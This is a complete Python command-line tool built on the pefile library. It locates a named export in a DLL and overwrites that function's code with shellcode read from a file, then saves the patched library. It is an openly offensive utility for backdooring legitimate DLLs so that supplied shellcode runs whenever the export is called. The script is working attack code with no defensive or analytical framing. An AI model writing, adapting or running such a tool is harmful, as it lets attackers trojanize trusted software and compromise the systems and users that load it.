import pefile
import argparse
import sys

def main():
    parser = argparse.ArgumentParser(description="Overwrite DLL export function with shellcode.")
    parser.add_argument("-i", required=True, help="Input DLL")
    parser.add_argument("-s", required=True, help="Shellcode file (raw)")
    parser.add_argument("-e", required=True, help="Exported function to overwrite")
    parser.add_argument("-o", required=True, help="Output patched DLL")
    args = parser.parse_args()

    pe = pefile.PE(args.i)

    with open(args.s, "rb") as f:
        shellcode = f.read()

    found = False
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        if exp.name and exp.name.decode() == args.e:
            export_rva = exp.address
            found = True
            break

    if not found:
        print(f"[-] Export '{args.e}' not found.")
        sys.exit(1)

    export_offset = pe.get_offset_from_rva(export_rva)

    section = next((s for s in pe.sections if s.VirtualAddress <= export_rva < s.VirtualAddress + s.Misc_VirtualSize), None)
    if not section:
        print("[-] Export lies outside valid section.")
        sys.exit(1)

    max_len = (section.VirtualAddress + section.Misc_VirtualSize) - export_rva
    if len(shellcode) > max_len:
        print(f"[-] Shellcode too large ({len(shellcode)} bytes > {max_len} max).")
        sys.exit(1)

    print(f"[+] Overwriting export '{args.e}' at RVA 0x{export_rva:X}, offset 0x{export_offset:X}")
    patched = bytearray(pe.__data__)
    patched[export_offset : export_offset + len(shellcode)] = shellcode
    pe.__data__ = bytes(patched)

    pe.write(args.o)
    print(f"[+] Patched DLL saved to: {args.o}")

if __name__ == "__main__":
    main()
